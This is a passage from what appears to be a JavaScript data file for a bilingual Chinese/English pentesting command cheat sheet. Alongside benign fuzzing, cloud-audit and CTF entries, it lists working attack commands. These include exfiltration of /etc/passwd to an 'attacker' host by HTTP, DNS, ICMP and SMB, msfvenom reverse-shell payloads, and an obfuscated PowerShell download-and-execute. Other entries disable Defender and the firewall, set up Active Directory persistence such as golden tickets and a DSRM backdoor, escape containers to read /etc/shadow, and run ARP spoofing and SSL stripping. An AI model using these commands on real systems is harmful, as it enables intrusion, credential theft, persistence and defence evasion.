      { name: { zh: '认证爆破', en: 'Authentication brute force' }, command: 'nmap -p 22 --script ssh-brute target\nnmap -p 21 --script ftp-brute target\nnmap -p 3306 --script mysql-brute target\nnmap -p 5432 --script pgsql-brute target', description: { zh: 'NSE 认证爆破脚本', en: 'NSE authentication brute force scripts' }, platform: 'all' },
      { name: { zh: '信息收集脚本', en: 'Information gathering scripts' }, command: 'nmap -p 25 --script smtp-enum-users target\nnmap -p 111 --script rpcinfo target\nnmap -p 161 --script snmp-info target\nnmap -p 389 --script ldap-search target', description: { zh: 'NSE 服务信息收集脚本', en: 'NSE service information gathering scripts' }, platform: 'all' },
      { name: { zh: '漏洞检测脚本', en: 'Vulnerability detection scripts' }, command: 'nmap -p 445 --script smb-vuln-ms17-010 target\nnmap -p 443 --script ssl-heartbleed target\nnmap --script http-shellshock target\nnmap -p 21 --script ftp-vsftpd-backdoor target', description: { zh: 'NSE 常见漏洞检测脚本', en: 'NSE common vulnerability detection scripts' }, platform: 'all' },
      { name: { zh: 'HTTP 脚本', en: 'HTTP scripts' }, command: 'nmap -p 80,443 --script http-headers,http-methods target\nnmap -p 80 --script http-backup-finder target\nnmap -p 80 --script http-wordpress-enum target\nnmap -p 80 --script http-phpmyadmin-dir-traversal target', description: { zh: 'NSE HTTP 相关脚本', en: 'NSE HTTP-related scripts' }, platform: 'all' }
    ],
    references: ['https://nmap.org/nsedoc/']
  },


  {
    id: 'network-pivoting-tools',
    name: { zh: '网络代理工具对比', en: 'Network Proxy Tools Reference' },
    description: { zh: '内网代理工具选型和使用场景速查', en: 'Intranet proxy tool selection and usage scenario reference' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    commands: [
      { name: { zh: 'Chisel (推荐)', en: 'Chisel (recommended)' }, command: '# 服务端\n./chisel server -p 8000 --reverse\n# 客户端反向 SOCKS5\n./chisel client attacker:8000 R:socks\n# 单端口转发\n./chisel client attacker:8000 R:3389:10.10.10.5:3389', description: { zh: 'Chisel HTTP 隧道，支持反向 SOCKS', en: 'Chisel HTTP tunnel with reverse SOCKS support' }, platform: 'all' },
      { name: { zh: 'Ligolo-ng (高级)', en: 'Ligolo-ng (advanced)' }, command: '# 代理服务端\nsudo ./proxy -selfcert\n# Agent 连接\n./agent -connect attacker:11601 -ignore-cert\n# 控制台添加路由\nsession; tunnel_start; interface_add_route 10.10.10.0/24', description: { zh: 'Ligolo-ng 基于 TUN 接口的高性能隧道', en: 'Ligolo-ng high-performance TUN interface tunnel' }, platform: 'linux' },
      { name: { zh: 'Metasploit 路由', en: 'Metasploit routing' }, command: 'use post/multi/manage/autoroute\nset SESSION 1; run\nuse auxiliary/server/socks_proxy\nset VERSION 5; set SRVPORT 1080; run', description: { zh: 'Metasploit 路由和 SOCKS', en: 'Metasploit route and SOCKS proxy' }, platform: 'linux' },
      { name: { zh: 'FRP (穿透公网)', en: 'FRP (public network traversal)' }, command: '# 适合穿透公网 NAT\n# 服务端: ./frps -c frps.toml\n# 客户端: ./frpc -c frpc.toml (内网目标机)\n# 用途: 内网主机直接通过公网 IP 访问', description: { zh: 'FRP 内网穿透到公网', en: 'FRP for NAT traversal to public internet' }, platform: 'all' }
    ],
    references: ['https://github.com/jpillora/chisel', 'https://github.com/nicocha30/ligolo-ng']
  },
  {
    id: 'ad-persistence',
    name: { zh: 'Active Directory 持久化', en: 'Active Directory Persistence' },
    description: { zh: 'Active Directory 权限维持技术速查', en: 'Active Directory persistence technique quick reference' },
    category: { zh: '域渗透', en: 'Domain Penetration' },
    commands: [
      { name: { zh: 'Golden Ticket 持久化', en: 'Golden ticket persistence' }, command: '# 获取 krbtgt 哈希\nlsadump::dcsync /domain:domain.com /user:krbtgt\n# 生成黄金票据\nkerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt\n# 验证\ndir \\\\dc\\c$', description: { zh: '利用 krbtgt 哈希生成永久黄金票据', en: 'Generate permanent golden ticket using krbtgt hash' }, platform: 'windows' },
      { name: { zh: 'Diamond Ticket', en: 'Diamond ticket' }, command: 'Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:KRBTGT_AES256 /nowrap', description: { zh: '更隐蔽的钻石票据', en: 'More stealthy diamond ticket attack' }, platform: 'windows' },
      { name: { zh: 'DSRM 后门', en: 'DSRM backdoor' }, command: '# 设置 DSRM 密码同步\nreg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f\n# 修改 DSRM 密码\nntdsutil "set dsrm password" "reset password on server null" "quitquit"', description: { zh: 'DSRM 目录服务恢复模式后门', en: 'Directory Services Restore Mode backdoor' }, platform: 'windows' },
      { name: { zh: 'SID History 注入', en: 'SID History injection' }, command: '# Mimikatz\nsid::patch\nsid::add /sam:normal_user /new:domain_admin\n# 需要 Domain Admin 权限', description: { zh: 'SID History 注入权限维持', en: 'SID history injection for persistence' }, platform: 'windows' },
      { name: { zh: 'AdminSDHolder 滥用', en: 'AdminSDHolder abuse' }, command: 'Add-DomainObjectAcl -TargetIdentity "AdminSDHolder" -PrincipalIdentity normal_user -Rights DCSync', description: { zh: '修改 AdminSDHolder 获取持久权限', en: 'Modify AdminSDHolder for persistent privileges' }, platform: 'windows' }
    ],
    references: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/persistence']
  },
  {
    id: 'web-fuzzing-wordlists',
    name: { zh: 'Web 字典资源', en: 'Web Fuzzing Wordlists' },
    description: { zh: 'Web 渗透测试常用字典资源和路径', en: 'Common wordlist resources and paths for web penetration testing' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install seclists / git clone https://github.com/danielmiessler/SecLists',
    commands: [
      { name: { zh: 'SecLists 字典路径', en: 'SecLists wordlist paths' }, command: '/usr/share/seclists/Discovery/Web-Content/\n  common.txt         # 通用目录\n  raft-medium-directories.txt  # 中型目录\n  big.txt            # 大型目录\n  top-usernames-shortlist.txt  # 用户名\n  common-and-port-specific-web-extensions.txt  # 扩展名', description: { zh: 'SecLists Web 内容发现字典', en: 'SecLists web content discovery wordlists' }, platform: 'linux' },
      { name: { zh: '密码字典', en: 'Password wordlists' }, command: '/usr/share/wordlists/rockyou.txt  # 最常用\n/usr/share/seclists/Passwords/\n  darkweb2017-top100.txt  # 常见密码\n  xato-net-10-million-passwords.txt\n/usr/share/seclists/Passwords/Default-Credentials/  # 默认凭证', description: { zh: '常用密码字典路径', en: 'Common password wordlist paths' }, platform: 'linux' },
      { name: { zh: '子域名字典', en: 'Subdomain wordlists' }, command: '/usr/share/seclists/Discovery/DNS/\n  subdomains-top1million-5000.txt\n  subdomains-top1million-20000.txt\n  n0kovo_subdomains_huge.txt\n  bitquark-subdomains-top100000.txt', description: { zh: '子域名枚举字典路径', en: 'Subdomain enumeration wordlist paths' }, platform: 'linux' },
      { name: { zh: '自定义字典生成', en: 'Custom wordlist generation' }, command: 'cewl https://target.com -d 2 -m 5 -o cewl.txt\ncrunch 8 8 abcdefgh -o 8chars.txt\ncupp -i  # 基于信息生成针对性字典', description: { zh: '生成自定义字典', en: 'Generate custom wordlists' }, platform: 'linux' }
    ],
    references: ['https://github.com/danielmiessler/SecLists']
  },
  {
    id: 'ctf-network-tools',
    name: { zh: 'CTF 网络题工具', en: 'CTF Network Challenge Tools' },
    description: { zh: 'CTF 网络流量分析和协议逆向工具命令', en: 'CTF network traffic analysis and protocol reverse engineering tools' },
    category: { zh: 'CTF/流量分析', en: 'CTF / Traffic Analysis' },
    commands: [
      { name: { zh: 'PCAP 快速分析', en: 'Quick PCAP analysis' }, command: "tshark -r traffic.pcap -q -z conv,tcp\ntshark -r traffic.pcap -Y 'http.request' -T fields -e http.request.full_uri\ntshark -r traffic.pcap -Y 'dns' -T fields -e dns.qry.name\nstrings traffic.pcap | grep -E 'flag|CTF|password'", description: { zh: 'PCAP 文件快速分析流程', en: 'Quick PCAP analysis workflow' }, platform: 'all' },
      { name: { zh: '提取 HTTP 对象', en: 'Extract HTTP objects' }, command: "tshark -r traffic.pcap --export-objects http,./http_export/\n# Wireshark: File -> Export Objects -> HTTP", description: { zh: '从 PCAP 提取 HTTP 对象', en: 'Extract HTTP objects from PCAP' }, platform: 'all' },
      { name: { zh: 'SSL/TLS 解密', en: 'SSL/TLS decryption' }, command: '# Wireshark: Edit -> Preferences -> Protocols -> TLS\n# 导入私钥或 SSLKEYLOGFILE\nexport SSLKEYLOGFILE=/tmp/ssl_keys.log\nchrome --ssl-key-log-file=/tmp/ssl_keys.log', description: { zh: 'Wireshark TLS 流量解密', en: 'Decrypt TLS traffic in Wireshark' }, platform: 'all' },
      { name: { zh: '自定义协议解析', en: 'Custom protocol parsing' }, command: "# Python 使用 scapy 解析\nfrom scapy.all import *\npkts = rdpcap('challenge.pcap')\nfor p in pkts:\n    if Raw in p: print(p[Raw].load.hex())", description: { zh: '自定义协议数据提取', en: 'Custom protocol data extraction' }, platform: 'all' }
    ],
    references: ['https://www.wireshark.org/docs/']
  },


  {
    id: 'evasion-techniques',
    name: { zh: 'AV/EDR 绕过技术', en: 'AV/EDR Evasion Techniques' },
    description: { zh: '反病毒和终端检测响应绕过命令', en: 'Antivirus and EDR evasion commands' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      { name: { zh: 'msfvenom 编码', en: 'msfvenom encoding' }, command: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=ip LPORT=443 -f raw | openssl enc -aes-256-cbc -out enc_payload', description: { zh: 'msfvenom 编码混淆 Payload', en: 'Encode and obfuscate payload with msfvenom' }, platform: 'linux' },
      { name: { zh: 'Shellter 注入', en: 'Shellter injection' }, command: 'shellter\n# 选择 Auto 模式\n# 指定合法 PE 文件 (如 putty.exe)\n# 选择 payload', description: { zh: '将 shellcode 注入合法 PE 文件', en: 'Inject shellcode into legitimate PE file' }, platform: 'windows' },
      { name: { zh: 'Veil Framework', en: 'Veil Framework' }, command: 'veil\n# 选择 Evasion\n# 选择 python/meterpreter/rev_tcp.py\n# 生成混淆 payload', description: { zh: 'Veil 免杀框架', en: 'Veil AV evasion framework' }, platform: 'linux' },
      { name: { zh: 'PowerShell 混淆', en: 'PowerShell obfuscation' }, command: "# Invoke-Obfuscation\nImport-Module Invoke-Obfuscation\nInvoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')} -Command TOKEN\\ALL\\1", description: { zh: 'PowerShell 命令混淆', en: 'PowerShell command obfuscation' }, platform: 'windows' },
      { name: { zh: 'Defender 排除', en: 'Defender exclusion' }, command: 'Add-MpPreference -ExclusionPath "C:\\Temp"\nAdd-MpPreference -ExclusionProcess "nc.exe"\nSet-MpPreference -DisableRealtimeMonitoring $true', description: { zh: '添加 Defender 排除项', en: 'Add Windows Defender exclusions' }, platform: 'windows' }
    ],
    references: ['https://github.com/Veil-Framework/Veil']
  },
  {
    id: 'bug-bounty-tools',
    name: { zh: 'Bug Bounty 工具链', en: 'Bug Bounty Toolkit' },
    description: { zh: 'Bug Bounty 漏洞赏金猎人工具链和流程', en: 'Bug bounty hunter toolkit and workflow' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: '子域名全流程', en: 'Subdomain full pipeline' }, command: '# 子域名发现\nsubfinder -d target.com -silent | anew subs.txt\nassetfinder --subs-only target.com | anew subs.txt\namass enum -passive -d target.com | anew subs.txt\n# 存活检测\ncat subs.txt | httpx -silent -o alive.txt\n# 漏洞扫描\ncat alive.txt | nuclei -t cves/ -severity high,critical', description: { zh: 'Bug Bounty 子域名侦察流程', en: 'Bug bounty subdomain reconnaissance pipeline' }, platform: 'linux' },
      { name: { zh: '参数发现', en: 'Parameter discovery' }, command: 'cat alive.txt | gau | grep "=" | anew params.txt\ncat params.txt | qsreplace "FUZZ" | tee fuzz_urls.txt\ncat fuzz_urls.txt | dalfox pipe -o xss.txt', description: { zh: 'URL 参数发现和 XSS 测试', en: 'URL parameter discovery and XSS testing' }, platform: 'linux' },
      { name: { zh: 'JS 分析', en: 'JavaScript analysis' }, command: 'cat alive.txt | subdomainizer -o js_subs.txt\ncat alive.txt | hakrawler -js | sort -u | tee js_files.txt\ncat js_files.txt | python3 relative-url-extractor.py | grep -E "api|key|secret|token"', description: { zh: 'JS 文件端点和密钥提取', en: 'Extract endpoints and secrets from JS files' }, platform: 'linux' },
      { name: { zh: '报告模板', en: 'Report template' }, command: '## 漏洞标题: [漏洞类型] in [功能点]\n## 严重程度: Critical/High/Medium/Low\n## 影响范围: ...\n## 复现步骤:\n1. 访问 https://target.com/...\n2. 发送以下请求...\n## 影响: ...\n## 修复建议: ...', description: { zh: 'Bug Bounty 报告模板', en: 'Bug bounty report template' }, platform: 'all' }
    ],
    references: ['https://github.com/projectdiscovery/nuclei']
  },


  {
    id: 'container-escape',
    name: { zh: '容器逃逸技术', en: 'Container Escape Techniques' },
    description: { zh: 'Docker/K8s 容器逃逸攻击命令', en: 'Docker/K8s container escape attack commands' },
    category: { zh: '容器安全', en: 'Container Security' },
    commands: [
      { name: { zh: '检测容器环境', en: 'Detect container env' }, command: 'cat /proc/1/cgroup | grep docker\nls /.dockerenv\ncat /proc/self/status | grep CapEff\ncapsh --decode=$(cat /proc/self/status | grep CapEff | awk "{print $2}")', description: { zh: '确认是否在容器内及特权状态', en: 'Confirm if inside container and privilege level' }, platform: 'linux' },
      { name: { zh: 'Cgroup v1 逃逸', en: 'Cgroup v1 escape' }, command: '# 检测可写 cgroup release_agent\nmount | grep cgroup\nmkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp\necho 1 > /tmp/cgrp/cgroup.clone_children\nsh -c "echo \\"#!/bin/sh\\ncat /etc/shadow > /tmp/output\\" > /cmd && chmod +x /cmd && echo /cmd > /tmp/cgrp/release_agent"', description: { zh: 'Cgroup release_agent 逃逸', en: 'Escape via cgroup release_agent' }, platform: 'linux' },
      { name: { zh: '挂载宿主机文件系统', en: 'Mount host filesystem' }, command: '# 特权容器\nfdisk -l\nmount /dev/sda1 /mnt\nchroot /mnt\n# 读取宿主机 shadow\ncat /mnt/etc/shadow', description: { zh: '特权容器挂载宿主文件系统', en: 'Mount host filesystem from privileged container' }, platform: 'linux' },
      { name: { zh: 'K8s ServiceAccount 逃逸', en: 'K8s ServiceAccount escape' }, command: 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\ncurl -k https://kubernetes.default.svc/api/v1/namespaces -H "Authorization: Bearer $TOKEN"\n# 创建特权 Pod 逃逸\nkubectl --token=$TOKEN run pwn --image=alpine --restart=Never --privileged', description: { zh: 'K8s ServiceAccount Token 逃逸', en: 'Escape via K8s ServiceAccount token' }, platform: 'linux' }
    ],
    references: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation']
  },
  {
    id: 'web-recon-advanced',
    name: { zh: 'Web 侦察高级技术', en: 'Advanced Web Reconnaissance Techniques' },
    description: { zh: 'Web 资产侦察高级方法和技巧', en: 'Advanced web asset reconnaissance methods and techniques' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'JS 文件端点提取', en: 'JS endpoint extraction' }, command: "# LinkFinder\npython3 linkfinder.py -i https://target.com -o cli\n# getJS\ngetJS --url https://target.com --output js_urls.txt\n# 手动提取\ncat js_file.js | grep -Eo '(\"|\\\\')/[a-zA-Z0-9/_-]+' | sort -u", description: { zh: '从 JS 文件提取 API 端点', en: 'Extract API endpoints from JavaScript files' }, platform: 'all' },
      { name: { zh: 'GraphQL 侦察', en: 'GraphQL recon' }, command: 'curl -X POST https://target.com/graphql -H "Content-Type: application/json" -d \'{"query":"{__schema{types{name}}}"}\'\n# InQL Burp 插件自动检测', description: { zh: 'GraphQL introspection 枚举', en: 'GraphQL introspection enumeration' }, platform: 'all' },
      { name: { zh: 'Wayback URL 分析', en: 'Wayback URL analysis' }, command: "waybackurls target.com | grep -E '\\.(php|asp|aspx|jsp)' | sort -u\nwaybackurls target.com | grep '?.*=' | sort -u | head -100\ngau target.com | grep -v '.png\\|.jpg\\|.css\\|.js'", description: { zh: '分析历史 URL 找漏洞点', en: 'Analyze historical URLs for vulnerability targets' }, platform: 'linux' },
      { name: { zh: '开放重定向发现', en: 'Open redirect discovery' }, command: "waybackurls target.com | grep -E 'redirect|return|redir|url=|next=' | head -30\ncat urls.txt | qsreplace 'https://evil.com' | while read url; do\n  curl -s -o /dev/null -w \"%{redirect_url} $url\\n\" \"$url\" | grep evil.com\ndone", description: { zh: '大规模开放重定向发现', en: 'Large-scale open redirect discovery' }, platform: 'linux' }
    ],
    references: ['https://github.com/GerbenJavado/LinkFinder']
  },
  {
    id: 'dns-attacks',
    name: { zh: 'DNS 攻击技术', en: 'DNS Attack Techniques' },
    description: { zh: 'DNS 安全测试和攻击命令', en: 'DNS security testing and attack commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'DNS 区域传送', en: 'DNS zone transfer' }, command: 'dig @ns1.target.com target.com AXFR\nnslookup\nserver ns1.target.com\nls -d target.com\ndnsrecon -d target.com -t axfr', description: { zh: 'DNS 区域传送漏洞测试', en: 'Test for DNS zone transfer vulnerability' }, platform: 'all' },
      { name: { zh: 'DNS 劫持测试', en: 'DNS hijacking test' }, command: '# 检测 DNS 劫持\ndig @8.8.8.8 target.com\ndig @1.1.1.1 target.com\n# 与 ISP DNS 比较结果', description: { zh: '检测 DNS 劫持和污染', en: 'Detect DNS hijacking and poisoning' }, platform: 'all' },
      { name: { zh: 'DNS 子域名接管', en: 'Subdomain takeover' }, command: 'subjack -w subs.txt -t 100 -o takeover.txt\n# 检测 CNAME 指向已过期服务\ncat subs.txt | dnsx -cname -resp | grep -E "azure|github|heroku|s3"', description: { zh: '子域名接管漏洞检测', en: 'Subdomain takeover vulnerability detection' }, platform: 'linux' },
      { name: { zh: 'DNS 反向查询', en: 'Reverse DNS lookup' }, command: 'for ip in $(seq 1 254); do host 192.168.1.$ip | grep -v "not found"; done\ndnsrecon -r 192.168.1.0/24 -t rvl', description: { zh: 'IP 段反向 DNS 查询', en: 'Reverse DNS lookup for IP ranges' }, platform: 'linux' }
    ],
    references: ['https://github.com/haccer/subjack']
  },


  {
    id: 'cloud-security-tools',
    name: { zh: '云安全工具集', en: 'Cloud Security Toolkit' },
    description: { zh: '云环境安全扫描和渗透测试工具', en: 'Cloud environment security scanning and penetration testing tools' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    commands: [
      { name: { zh: 'ScoutSuite', en: 'ScoutSuite multi-cloud audit' }, command: 'scout aws\nscout azure --cli\nscout gcp --service-account key.json', description: { zh: 'AWS/Azure/GCP 多云安全审计', en: 'Multi-cloud AWS/Azure/GCP security audit' }, platform: 'all' },
      { name: { zh: 'CloudSploit', en: 'CloudSploit scan' }, command: 'git clone https://github.com/aquasecurity/cloudsploit\nnpm install\nnode index.js --cloud=aws', description: { zh: 'CloudSploit 云配置扫描', en: 'CloudSploit cloud config scanning' }, platform: 'all' },
      { name: { zh: 'Steampipe', en: 'Steampipe query' }, command: 'steampipe query "select * from aws_s3_bucket where bucket_policy_is_public"\nsteampipe check benchmark.aws_compliance.hipaa', description: { zh: 'Steampipe 云资产 SQL 查询', en: 'Query cloud assets with SQL via Steampipe' }, platform: 'all' },
      { name: { zh: 'CloudMapper', en: 'CloudMapper visualize' }, command: 'python cloudmapper.py collect --account myaccount\npython cloudmapper.py prepare --account myaccount\npython cloudmapper.py webserver', description: { zh: 'AWS 网络关系可视化', en: 'Visualize AWS network relationships' }, platform: 'all' }
    ],
    references: ['https://github.com/nccgroup/ScoutSuite']
  },
  {
    id: 'network-attacks',
    name: { zh: '网络层攻击', en: 'Network Layer Attacks' },
    description: { zh: 'ARP/MITM/流量注入等网络层攻击命令', en: 'ARP/MITM/traffic injection and other network layer attack commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install ettercap-graphical bettercap',
    commands: [
      { name: { zh: 'ARP 欺骗', en: 'ARP spoofing' }, command: 'arpspoof -i eth0 -t victim gateway\n# 两向欺骗\narpspoof -i eth0 -t victim gateway &\narpspoof -i eth0 -t gateway victim', description: { zh: 'ARP 欺骗中间人攻击', en: 'ARP spoofing man-in-the-middle attack' }, platform: 'linux' },
      { name: { zh: 'Bettercap 框架', en: 'Bettercap framework' }, command: 'bettercap\n# 交互命令\nnet.probe on\narp.spoof on\nnet.sniff on\nhttps.proxy on', description: { zh: 'Bettercap MITM 框架', en: 'Bettercap MITM framework' }, platform: 'linux' },
      { name: { zh: 'SSL Strip', en: 'SSL stripping' }, command: '# 启用转发\necho 1 > /proc/sys/net/ipv4/ip_forward\n# sslstrip\nsslstrip -l 8080\niptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080', description: { zh: 'SSL Strip HTTPS 降级攻击', en: 'SSL strip HTTPS downgrade attack' }, platform: 'linux' }
    ],
    references: ['https://www.bettercap.org/']
  },


  {
    id: 'exfiltration-techniques',
    name: { zh: '数据外带技术', en: 'Data Exfiltration Techniques' },
    description: { zh: '绕过防护的数据外带方法', en: 'Data exfiltration methods for bypassing defenses' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    commands: [
      { name: { zh: 'ICMP 外带', en: 'ICMP exfiltration' }, command: '# 攻击者监听\ntcpdump -i any icmp -X\n# 目标发送\nping -c 1 -p $(xxd -p /etc/passwd | head -c 16) attacker', description: { zh: '通过 ICMP 包携带数据外带', en: 'Exfiltrate data via ICMP packets' }, platform: 'linux' },
      { name: { zh: 'DNS 外带', en: 'DNS exfiltration' }, command: "data=$(cat /etc/passwd | base64 | tr -d '\\n')\nfor i in $(seq 0 63 ${#data}); do\n  chunk=${data:$i:63}\n  dig ${chunk}.attacker.com @attacker\ndone", description: { zh: 'DNS 子域名携带数据外带', en: 'Exfiltrate data via DNS subdomain labels' }, platform: 'linux' },
      { name: { zh: 'HTTP 外带', en: 'HTTP exfiltration' }, command: 'curl -s "http://attacker/receive?data=$(cat /etc/passwd | base64 | tr +/ -_ | tr -d =)"\nwget -q "http://attacker/?$(whoami)"', description: { zh: '通过 HTTP 请求参数外带数据', en: 'Exfiltrate data via HTTP request parameters' }, platform: 'linux' },
      { name: { zh: 'SMB 外带', en: 'SMB exfiltration' }, command: '# 攻击者启动 SMB 服务\nimpacket-smbserver share /tmp -smb2support\n# 目标复制文件\ncopy C:\\sensitive.txt \\\\attacker\\share\\', description: { zh: '通过 SMB 协议传输文件', en: 'Exfiltrate files via SMB protocol' }, platform: 'all' }
    ],
    references: ['https://github.com/pentestmonkey/pdf-export']
  },
  {
    id: 'vulnerability-research',
    name: { zh: '漏洞研究工具', en: 'Vulnerability Research Tools' },
    description: { zh: '漏洞挖掘和研究常用工具命令', en: 'Common tool commands for vulnerability discovery and research' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'AFL++ 模糊测试', en: 'AFL++ fuzzing' }, command: 'afl-fuzz -i input_dir -o output_dir -- ./target @@\nafl-fuzz -i seeds/ -o findings/ -x dict.txt -- ./binary @@', description: { zh: 'AFL++ 覆盖率引导模糊测试', en: 'AFL++ coverage-guided fuzzing' }, platform: 'linux' },
      { name: { zh: 'libFuzzer', en: 'libFuzzer' }, command: 'clang -fsanitize=fuzzer,address -o fuzz_target fuzz.c\n./fuzz_target -max_total_time=60 corpus/', description: { zh: 'libFuzzer 集成模糊测试', en: 'libFuzzer integrated fuzzing' }, platform: 'linux' },
      { name: { zh: 'Boofuzz 协议模糊', en: 'Boofuzz protocol fuzzing' }, command: 'pip install boofuzz\n# Python 脚本定义协议\nfrom boofuzz import *\nsession = Session(target=Target(connection=TCPSocketConnection("target", 21)))', description: { zh: 'Boofuzz 网络协议模糊测试', en: 'Boofuzz network protocol fuzzing' }, platform: 'all' },
      { name: { zh: 'Honggfuzz', en: 'Honggfuzz' }, command: 'honggfuzz -i corpus/ -- ./target @@\nhonggfuzz --persistent -i corpus -- ./fuzz_target', description: { zh: 'Honggfuzz 快速模糊测试', en: 'Fast fuzzing with Honggfuzz' }, platform: 'linux' }
    ],
    references: ['https://github.com/AFLplusplus/AFLplusplus']
  },
  {
    id: 'windows-system-commands',
    name: { zh: 'Windows 系统命令全览', en: 'Windows System Commands Reference' },
    description: { zh: 'Windows 渗透测试系统命令综合速查', en: 'Comprehensive Windows system command reference for penetration testing' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: '用户和组管理', en: 'User and group management' }, command: 'net user\nnet user admin /add\nnet localgroup administrators admin /add\nnet user guest /active:yes\nnet user admin password123', description: { zh: 'Windows 用户账户管理', en: 'Windows user account management' }, platform: 'windows' },
      { name: { zh: '网络命令', en: 'Network commands' }, command: 'ipconfig /all\nnetstat -ano\nroute print\narp -a\nnslookup target.com\nnetsh wlan show profiles', description: { zh: 'Windows 网络信息命令', en: 'Windows network information commands' }, platform: 'windows' },
      { name: { zh: '文件系统', en: 'File system' }, command: 'dir /s /b C:\\*secret* 2>nul\ntype C:\\Windows\\win.ini\nattrib +h +s file.txt  # 隐藏文件\nicacls C:\\path /grant user:F\nrobocopy src dst /E /COPY:DAT', description: { zh: 'Windows 文件系统操作', en: 'Windows file system operations' }, platform: 'windows' },
      { name: { zh: '进程和服务', en: 'Processes and services' }, command: 'tasklist /v\ntaskkill /PID 1234 /F\nsc query\nsc start/stop ServiceName\nwmic process list brief', description: { zh: 'Windows 进程和服务管理', en: 'Windows process and service management' }, platform: 'windows' },
      { name: { zh: '防火墙管理', en: 'Firewall management' }, command: 'netsh advfirewall show allprofiles\nnetsh advfirewall set allprofiles state off\nnetsh advfirewall firewall add rule name="evil" dir=in action=allow protocol=tcp localport=4444', description: { zh: 'Windows 防火墙规则管理', en: 'Windows firewall rule management' }, platform: 'windows' }
    ],
    references: ['https://ss64.com/nt/']
  },
  {
    id: 'ctf-rev-tools',
    name: { zh: 'CTF 逆向工具集', en: 'CTF Reverse Engineering Tools' },
    description: { zh: 'CTF 二进制逆向分析完整工具集', en: 'Complete tool set for CTF binary reverse engineering' },
    category: { zh: '逆向工程', en: 'Reverse Engineering' },
    commands: [
      { name: { zh: 'file + strings 初步分析', en: 'Initial analysis: file + strings' }, command: 'file binary\nstrings binary | head -50\nstrings -a -n 4 binary | grep -iE "flag|key|pass|secret"\nxxd binary | head -30', description: { zh: '二进制文件初步分析', en: 'Initial binary file analysis' }, platform: 'all' },
      { name: { zh: 'ltrace / strace 动态分析', en: 'Dynamic analysis: ltrace/strace' }, command: 'strace ./binary 2>&1 | head -50\nltrace ./binary 2>&1 | head -50\n# 过滤关键调用\nstrace ./binary 2>&1 | grep -E "open|read|write"', description: { zh: '动态跟踪系统调用和库函数', en: 'Trace system calls and library functions dynamically' }, platform: 'linux' },
      { name: { zh: 'Ghidra 快速入门', en: 'Ghidra quick start' }, command: './ghidraRun\n# 快捷键:\n# G = 跳转地址\n# Ctrl+G = 转到函数\n# L = 重命名\n# ; = 添加注释\n# Ctrl+Shift+F = 搜索字符串\n# F = 分析函数', description: { zh: 'Ghidra 逆向工程快速入门', en: 'Quick start guide for Ghidra reverse engineering' }, platform: 'all' },
      { name: { zh: 'x64dbg 动态调试', en: 'x64dbg dynamic debugging' }, command: '# Windows 调试器\n# F2 = 断点\n# F9 = 运行\n# F7 = 单步进入\n# F8 = 单步跳过\n# Ctrl+G = 跳转地址\n# Ctrl+F = 搜索命令', description: { zh: 'x64dbg Windows 二进制调试', en: 'Debug Windows binaries with x64dbg' }, platform: 'windows' },
      { name: { zh: 'Python ctypes 解题', en: 'Python ctypes solution' }, command: "import ctypes\nlib = ctypes.CDLL('./binary.so')\nlib.check_password.argtypes = [ctypes.c_char_p]\nlib.check_password.restype = ctypes.c_int\nfor password in wordlist:\n    if lib.check_password(password.encode()): print(password)", description: { zh: '使用 ctypes 调用逆向目标', en: 'Call reverse engineering target using ctypes' }, platform: 'all' }
    ],
    references: ['https://github.com/NationalSecurityAgency/ghidra', 'https://x64dbg.com/']
  },


  {
    id: 'mobile-pentest-tools',
    name: { zh: '移动端渗透测试工具', en: 'Mobile Penetration Testing Tools' },
    description: { zh: 'Android/iOS 移动应用安全测试工具命令', en: 'Android/iOS mobile application security testing tool commands' },
    category: { zh: '移动安全', en: 'Mobile Security' },
    commands: [
      { name: { zh: 'MobSF 静态分析', en: 'MobSF static analysis' }, command: 'docker pull opensecurity/mobile-security-framework-mobsf\ndocker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf\n# 访问 http://localhost:8000', description: { zh: 'MobSF 移动安全框架', en: 'MobSF mobile security framework' }, platform: 'all' },
      { name: { zh: 'APK 反编译分析', en: 'APK decompile analysis' }, command: 'apktool d app.apk -o decompiled/\ngrep -r "http\\|https\\|api\\|key\\|token\\|password" decompiled/\ngrep -r "AES\\|RSA\\|MD5\\|SHA" decompiled/ --include="*.java"', description: { zh: 'APK 反编译和敏感信息搜索', en: 'Decompile APK and search for sensitive info' }, platform: 'all' },
      { name: { zh: 'Drozer Android 测试', en: 'Drozer Android testing' }, command: '# 启动 Drozer 服务端\nadb forward tcp:31415 tcp:31415\ndrozer console connect\n# 常用命令\nrun app.package.list -f target\nrun app.package.info -a com.target\nrun app.activity.info -a com.target\nrun app.activity.start --component com.target .ExportedActivity', description: { zh: 'Drozer Android 组件测试', en: 'Drozer Android component testing' }, platform: 'all' },
